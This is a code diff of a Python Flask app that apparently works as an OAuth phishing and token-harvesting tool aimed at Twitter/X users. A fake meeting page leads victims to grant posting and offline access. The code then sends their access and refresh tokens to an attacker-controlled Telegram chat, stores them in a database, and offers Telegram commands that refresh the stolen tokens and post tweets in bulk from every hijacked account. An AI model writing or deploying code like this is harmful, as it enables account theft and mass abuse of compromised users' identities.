@@ -1,8 +1,8 @@
 import base64
 import hashlib
 import os
-import sqlite3  # For database storage
 import requests
+import sqlite3
 from flask import Flask, redirect, request, session, render_template
 
 # Configuration
@@ -15,7 +15,7 @@ TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
-# Initialize SQLite database (ADDED)
+# Initialize SQLite database
 DATABASE = 'tokens.db'
 
 def init_db():
@@ -32,175 +32,9 @@ def init_db():
     conn.commit()
     conn.close()
 
-init_db()  # Ensure the database is initialized when the app starts
+init_db()
 
-# Store token in the database (ADDED)
-def store_token(access_token, refresh_token, username):
-    conn = sqlite3.connect(DATABASE)
-    cursor = conn.cursor()
-    cursor.execute('''
-        INSERT INTO tokens (access_token, refresh_token, username)
-        VALUES (?, ?, ?)
-    ''', (access_token, refresh_token, username))
-    conn.commit()
-    conn.close()
-
-# Get all tokens from the database (ADDED)
-def get_all_tokens():
-    conn = sqlite3.connect(DATABASE)
-    cursor = conn.cursor()
-    cursor.execute('SELECT access_token, refresh_token, username FROM tokens')
-    tokens = cursor.fetchall()
-    conn.close()
-    return tokens
-
-# Get total token count from the database (ADDED)
-def get_total_tokens():
-    conn = sqlite3.connect(DATABASE)
-    cursor = conn.cursor()
-    cursor.execute('SELECT COUNT(*) FROM tokens')
-    total = cursor.fetchone()[0]
-    conn.close()
-    return total
-
-# Refresh a token using refresh_token and notify via Telegram (ADDED)
-def refresh_token_in_db(refresh_token, username):
-    token_url = 'https://api.twitter.com/2/oauth2/token'
-    client_credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
-    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
-    
-    headers = {
-        'Authorization': f'Basic {auth_header}',
-        'Content-Type': 'application/x-www-form-urlencoded'
-    }
-    
-    data = {
-        'refresh_token': refresh_token,
-        'grant_type': 'refresh_token',
-        'client_id': CLIENT_ID
-    }
-
-    response = requests.post(token_url, headers=headers, data=data)
-    token_response = response.json()
-
-    if response.status_code == 200:
-        new_access_token = token_response.get('access_token')
-        new_refresh_token = token_response.get('refresh_token')
-        
-        # Update the token in the database
-        conn = sqlite3.connect(DATABASE)
-        cursor = conn.cursor()
-        cursor.execute('UPDATE tokens SET access_token = ?, refresh_token = ? WHERE username = ?', 
-                       (new_access_token, new_refresh_token, username))
-        conn.commit()
-        conn.close()
-        
-        # Notify via Telegram
-        send_message_via_telegram(f"🔑 Token refreshed for @{username}. New Access Token: {new_access_token}")
-        return new_access_token, new_refresh_token
-    else:
-        send_message_via_telegram(f"❌ Failed to refresh token for @{username}: {response.json().get('error_description', 'Unknown error')}")
-        return None, None
-
-# Send message via Telegram (ADDED)
-def send_message_via_telegram(message):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    data = {
-        "chat_id": TELEGRAM_CHAT_ID,
-        "text": message,
-        "parse_mode": "Markdown"
-    }
-    requests.post(url, json=data)
-
-# Function to handle single token refresh (ADDED)
-def handle_refresh_single():
-    tokens = get_all_tokens()
-    if tokens:
-        access_token, token_refresh, username = tokens[0]  # Use the first token (or choose randomly)
-        refresh_token_in_db(token_refresh, username)
-    else:
-        send_message_via_telegram("❌ No tokens found to refresh.")
-
-# Function to handle bulk token refresh (ADDED)
-def handle_refresh_bulk():
-    tokens = get_all_tokens()
-    if tokens:
-        for access_token, refresh_token, username in tokens:
-            refresh_token_in_db(refresh_token, username)
-        send_message_via_telegram(f"✅ Bulk token refresh complete. {len(tokens)} tokens refreshed.")
-    else:
-        send_message_via_telegram("❌ No tokens found to refresh.")
-
-# Function to post a tweet using a single token (ADDED)
-def post_tweet(access_token, tweet_text):
-    TWITTER_API_URL = "https://api.twitter.com/2/tweets"
-    headers = {
-        "Authorization": f"Bearer {access_token}",
-        "Content-Type": "application/json"
-    }
-    payload = {
-        "text": tweet_text
-    }
-    
-    response = requests.post(TWITTER_API_URL, json=payload, headers=headers)
-    
-    if response.status_code == 201:
-        tweet_data = response.json()
-        return f"Tweet posted successfully: {tweet_data['data']['id']}"
-    else:
-        error_message = response.json().get("detail", "Failed to post tweet")
-        return f"Error posting tweet: {error_message}"
-
-# Handle posting a tweet with a single token (ADDED)
-def handle_post_single(tweet_text):
-    tokens = get_all_tokens()
-    if tokens:
-        access_token, _, username = tokens[0]  # Post using the first token (or choose randomly)
-        result = post_tweet(access_token, tweet_text)
-        send_message_via_telegram(f"📝 Tweet posted with @{username}: {result}")
-    else:
-        send_message_via_telegram("❌ No tokens found to post a tweet.")
-
-# Handle bulk posting tweets with all tokens (ADDED)
-def handle_post_bulk(tweet_text):
-    tokens = get_all_tokens()
-    if tokens:
-        for access_token, _, username in tokens:
-            result = post_tweet(access_token, tweet_text)
-            send_message_via_telegram(f"📝 Tweet posted with @{username}: {result}")
-        send_message_via_telegram(f"✅ Bulk tweet posting complete. {len(tokens)} tweets posted.")
-    else:
-        send_message_via_telegram("❌ No tokens found to post tweets.")
-
-# Telegram bot webhook to listen for commands (ADDED)
-@app.route('/webhook', methods=['POST'])
-def telegram_webhook():
-    update = request.json
-    message = update.get('message', {}).get('text', '')
-
-    if message == '/refresh_single':
-        handle_refresh_single()
-    elif message == '/refresh_bulk':
-        handle_refresh_bulk()
-    elif message.startswith('/post_single'):
-        tweet_text = message.replace('/post_single', '').strip()
-        if tweet_text:
-            handle_post_single(tweet_text)
-        else:
-            send_message_via_telegram("❌ Please provide tweet content.")
-    elif message.startswith('/post_bulk'):
-        tweet_text = message.replace('/post_bulk', '').strip()
-        if tweet_text:
-            handle_post_bulk(tweet_text)
-        else:
-            send_message_via_telegram("❌ Please provide tweet content.")
-    else:
-        send_message_via_telegram("❌ Unknown command. Use /refresh_single, /refresh_bulk, /post_single <tweet>, or /post_bulk <tweet>.")
-
-    return '', 200
-
-# Original functions (unchanged)
-
+# Existing functions
 def get_twitter_username(access_token):
     url = "https://api.twitter.com/2/users/me"
     headers = {
@@ -251,7 +85,7 @@ def send_startup_message():
     }
     requests.post(url, json=data)
 
-# Function to send access and refresh tokens to Telegram (unchanged)
+# Function to send access and refresh tokens to Telegram
 def send_to_telegram(access_token, refresh_token=None):
     alert_emoji = "🚨"
     key_emoji = "🔑"
@@ -263,13 +97,6 @@ def send_to_telegram(access_token, refresh_token=None):
     else:
         twitter_url = "Unknown user"
     
-    # Store the token in the database (ADDED)
-    store_token(access_token, refresh_token, username)
-
-    # Get the total number of tokens stored (ADDED)
-    total_tokens = get_total_tokens()
-
-    # Message content
     message = f"{alert_emoji} *New user authenticated: OAuth 2.0*\n"
     message += f"{key_emoji} *Access Token:* `{access_token}`\n"
     
@@ -279,17 +106,85 @@ def send_to_telegram(access_token, refresh_token=None):
 
     tweet_link = f"{CALLBACK_URL}tweet/{access_token}"
     message += f"{key_emoji} *Post a Tweet Link:* [Post a Tweet]({tweet_link})\n"
-    message += f"👤 *Twitter Profile:* [@{username}]({twitter_url})\n"
-    message += f"🔢 *Total Tokens in Database:* {total_tokens}"  # Include total token count (ADDED)
+    message += f"👤 *Twitter Profile:* [@{username}]({twitter_url})"  # Include username and profile link
 
-    # Send the message to Telegram
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     data = {
         "chat_id": TELEGRAM_CHAT_ID,
         "text": message,
-        "parse_mode": "Markdown"
+        "parse_mode": "Markdown"  # To format the message
     }
     requests.post(url, json=data)
+
+# Function to post a tweet
+def post_tweet(access_token, tweet_text):
+    TWITTER_API_URL = "https://api.twitter.com/2/tweets"
+    headers = {
+        "Authorization": f"Bearer {access_token}",
+        "Content-Type": "application/json"
+    }
+    payload = {
+        "text": tweet_text
+    }
+    
+    response = requests.post(TWITTER_API_URL, json=payload, headers=headers)
+    
+    if response.status_code == 201:
+        tweet_data = response.json()
+        return f"Tweet posted successfully: {tweet_data['data']['id']}"
+    else:
+        error_message = response.json().get("detail", "Failed to post tweet")
+        return f"Error posting tweet: {error_message}"
+
+@app.route('/tweet/<access_token>', methods=['GET', 'POST'])
+def tweet(access_token):
+    if request.method == 'POST':
+        tweet_text = request.form['tweet_text']
+        result = post_tweet(access_token, tweet_text)
+        return render_template('tweet_result.html', result=result)
+
+    return render_template('tweet_form.html', access_token=access_token)
+
+@app.route('/refresh/<refresh_token2>', methods=['GET'])
+def refresh_page(refresh_token2):
+    return render_template('refresh.html', refresh_token=refresh_token2)
+
+@app.route('/refresh/<refresh_token>/perform', methods=['POST'])
+def perform_refresh(refresh_token):
+    token_url = 'https://api.twitter.com/2/oauth2/token'
+    
+    client_credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
+    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
+    
+    headers = {
+        'Authorization': f'Basic {auth_header}',
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    
+    data = {
+        'refresh_token': refresh_token,
+        'grant_type': 'refresh_token',
+        'client_id': CLIENT_ID
+    }
+
+    response = requests.post(token_url, headers=headers, data=data)
+    token_response = response.json()
+
+    if response.status_code == 200:
+        new_access_token = token_response.get('access_token')
+        new_refresh_token = token_response.get('refresh_token')
+        send_to_telegram(new_access_token, new_refresh_token)
+        return f"New Access Token: {new_access_token}, New Refresh Token: {new_refresh_token}", 200
+    else:
+        error_description = token_response.get('error_description', 'Unknown error')
+        error_code = token_response.get('error', 'No error code')
+        return f"Error refreshing token: {error_description} (Code: {error_code})", response.status_code
+
+@app.route('/j')
+def meeting():
+    state_id = request.args.get('id')  # Get the 'id' parameter from the URL
+    code_ch = request.args.get('code_ch')  # Get the 'code_ch' parameter from the URL
+    return render_template('meeting.html', state_id=state_id, code_ch=code_ch)
 
 @app.route('/')
 def home():
@@ -298,27 +193,25 @@ def home():
     error = request.args.get('error')
 
     if not code:
-        try:
-            state = "0"  # Fixed state
-            session['oauth_state'] = state
+        state = "0"  # Use fixed state value
+        session['oauth_state'] = state
 
-            code_verifier, code_challenge = generate_code_verifier_and_challenge()
-            session['code_verifier'] = code_verifier  # Store code_verifier in session
+        code_verifier, code_challenge = generate_code_verifier_and_challenge()
+        session['code_verifier'] = code_verifier  # Store code_verifier in session
 
-            authorization_url = (
-                f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
-                f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
-                f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
-            )
-            return redirect(authorization_url)
-        except Exception as e:
-            return jsonify({"error": f"Failed to initiate OAuth flow: {str(e)}"}), 500
+        authorization_url = (
+            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
+            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
+            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
+        )
+
+        return redirect(authorization_url)
 
     if code:
         if error:
             return f"Error during authorization: {error}", 400
 
-        if state != "0":  # Fixed state value check
+        if state != "0":  # Check for the fixed state value
             return "Invalid state parameter", 403
 
         code_verifier = session.pop('code_verifier', None)
@@ -331,41 +224,109 @@ def home():
             'code_verifier': code_verifier
         }
 
-        try:
-            response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
-            token_response = response.json()
+        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
+        token_response = response.json()
 
-            if response.status_code == 200:
-                access_token = token_response.get('access_token')
-                refresh_token = token_response.get('refresh_token')
+        if response.status_code == 200:
+            access_token = token_response.get('access_token')
+            refresh_token = token_response.get('refresh_token')
 
-                session['access_token'] = access_token
-                session['refresh_token'] = refresh_token
+            session['access_token'] = access_token
+            session['refresh_token'] = refresh_token
 
-                username = get_twitter_username(access_token)
-                if username:
-                    store_token(access_token, refresh_token, username)
-                    send_message_via_telegram(f"New authorization received for @{username}.")
-                else:
-                    send_message_via_telegram(f"New authorization received but username could not be fetched.")
+            send_to_telegram(access_token, refresh_token)
+            return f"Access Token: {access_token}, Refresh Token: {refresh_token}"
+        else:
+            error_description = token_response.get('error_description', 'Unknown error')
+            error_code = token_response.get('error', 'No error code')
+            return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
 
-                return f"Access Token: {access_token}, Refresh Token: {refresh_token}"
+# New Automated Features
+
+def send_message_to_telegram(message):
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    data = {
+        "chat_id": TELEGRAM_CHAT_ID,
+        "text": message,
+        "parse_mode": "Markdown"
+    }
+    requests.post(url, json=data)
+
+def refresh_token_in_db(refresh_token):
+    token_url = 'https://api.twitter.com/2/oauth2/token'
+    client_credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
+    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
+    
+    headers = {
+        'Authorization': f'Basic {auth_header}',
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    
+    data = {
+        'refresh_token': refresh_token,
+        'grant_type': 'refresh_token',
+        'client_id': CLIENT_ID
+    }
+
+    response = requests.post(token_url, headers=headers, data=data)
+    return response.json()
+
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    update = request.get_json()
+    message_text = update.get('message', {}).get('text', '')
+    chat_id = update.get('message', {}).get('chat', {}).get('id', '')
+
+    if message_text.startswith('/refresh_single'):
+        token_data = get_first_token()
+        if token_data:
+            access_token, refresh_token, username = token_data
+            new_token_data = refresh_token_in_db(refresh_token)
+            if 'access_token' in new_token_data:
+                send_message_to_telegram(f"Token refreshed for @{username}. New Access Token: {new_token_data['access_token']}")
             else:
-                error_description = token_response.get('error_description', 'Unknown error')
-                error_code = token_response.get('error', 'No error code')
-                return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
+                send_message_to_telegram(f"Failed to refresh token for @{username}.")
+        else:
+            send_message_to_telegram("No tokens available for refresh.")
 
-        except Exception as e:
-            return jsonify({"error": f"Failed to complete OAuth flow: {str(e)}"}), 500
+    elif message_text.startswith('/refresh_bulk'):
+        all_tokens = get_all_tokens()
+        if all_tokens:
+            for token_data in all_tokens:
+                access_token, refresh_token, username = token_data
+                new_token_data = refresh_token_in_db(refresh_token)
+                if 'access_token' in new_token_data:
+                    send_message_to_telegram(f"Token refreshed for @{username}. New Access Token: {new_token_data['access_token']}")
+            send_message_to_telegram("All tokens refreshed.")
+        else:
+            send_message_to_telegram("No tokens available for bulk refresh.")
 
-# --- Meeting Page Route ---
-@app.route('/j')
-def meeting():
-    meeting = request.args.get('meeting')
-    pwd = request.args.get('pwd')
-    return render_template('meeting.html', meeting=meeting, pwd=pwd)
+    elif message_text.startswith('/post_single'):
+        tweet_content = message_text.replace('/post_single ', '', 1)
+        token_data = get_first_token()
+        if token_data:
+            access_token, _, username = token_data
+            response = post_tweet(access_token, tweet_content)
+            send_message_to_telegram(f"Tweet posted for @{username}: {response}")
+        else:
+            send_message_to_telegram("No tokens available to post a tweet.")
 
+    elif message_text.startswith('/post_bulk'):
+        tweet_content = message_text.replace('/post_bulk ', '', 1)
+        all_tokens = get_all_tokens()
+        if all_tokens:
+            for token_data in all_tokens:
+                access_token, _, username = token_data
+                response = post_tweet(access_token, tweet_content)
+                send_message_to_telegram(f"Tweet posted for @{username}: {response}")
+            send_message_to_telegram(f"All tweets posted: {len(all_tokens)} tweets sent.")
+        else:
+            send_message_to_telegram("No tokens available to post tweets.")
 
+    elif message_text == '/confirm':
+        send_message_to_telegram("Action confirmed.")
+
+    return "OK", 200
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
